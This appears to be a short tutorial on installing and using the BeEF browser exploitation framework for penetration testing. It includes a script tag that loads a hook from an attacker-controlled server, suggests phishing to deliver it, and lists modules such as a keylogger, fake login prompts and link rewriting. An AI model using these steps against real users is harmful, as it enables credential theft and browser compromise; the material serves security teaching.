# BeEF
**Document the steps involved in the setup and execution of BeEF and provide examples of browser-based attacks that can fie conducted using the framework**

BeEF (Browser Exploitation Framework) is an open-source penetration testing tool that focuses on web browsers. It allows security professionals to assess the security posture of a target environment by using client-side attack vectors. BeEF enables the hooking of one or more web browsers and uses them as beachheads for launching directed command modules and further attacks from within the browser context. [1]

---

 Setting Up BeEF

 Prerequisites

- A Linux-based system (e.g., Kali Linux).

- Ruby (version > 2.5).

- RubyGems.

- SQLite3.

 Installation Steps

1. Update the system:

   bash
   sudo apt update
   

2. Install BeEF and dependencies:

   bash
   sudo apt install beef-xss libsqlite3-dev -y
   

3. Install the required Ruby gem:

   bash
   gem install sqlite3
   

4. Navigate to BeEF's directory:

   bash
   cd /usr/share/beef-xss
   

5. Install necessary Ruby gems:

   bash
   bundle install
   

6. Configure BeEF (optional):

   Edit the configuration file to set custom credentials:

   ```bash
   sudo vi config.yaml
   Update the default username and password as desired.

7. *Start BeEF:*

   bash
   ./beef
   

   BeEF will start and provide URLs for the user interface and the hook script.

---

 Accessing BeEF

- *BeEF Control Panel:* Navigate to `http://127.0.0.1:3000/ui/panel` in your browser.

- *Login Credentials:* Use the default credentials (`beef`/`beef`) or the ones set during configuration.

- *Hook Script URL:* BeEF will display a hook script URL, typically `http://127.0.0.1:3000/hook.js`.

---

 Hooking a Browser

To hook a target's browser:

1. *Create a Web Page with the Hook Script:*

   Embed the hook script into a web page:

   html
   <script src="http://your_beef_server_ip:3000/hook.js"></script>
   ```

2. Deliver the Page to the Target:

   Use social engineering techniques, such as phishing emails or malicious links, to entice the target to visit the page.

3. Monitor BeEF Interface:

   Once the target accesses the page, their browser will appear as a "hooked" session in the BeEF control panel.


🛠 Demonstrating Browser-Based Attacks

After successfully hooking a browser, BeEF offers various modules to demonstrate potential vulnerabilities:

 Information Gathering

- Get Page HREFs: Retrieves all hyperlinks from the current page.
  - Get Page HTML: Fetches the entire HTML content of the page.

- Fingerprinting: Identifies browser type, version, and plugins.

 Social Engineering

- Fake Login Prompt: Displays a counterfeit login form to capture credentials.

- Alert Dialog: Shows a JavaScript alert box with a custom message.

 Exploitation

- Keylogger: Records keystrokes entered by the user.

- Redirect Browser: Forces the browser to navigate to a specified URL.

- Replace HREFs: Modifies all hyperlinks on the page to point to a malicious site. [2]

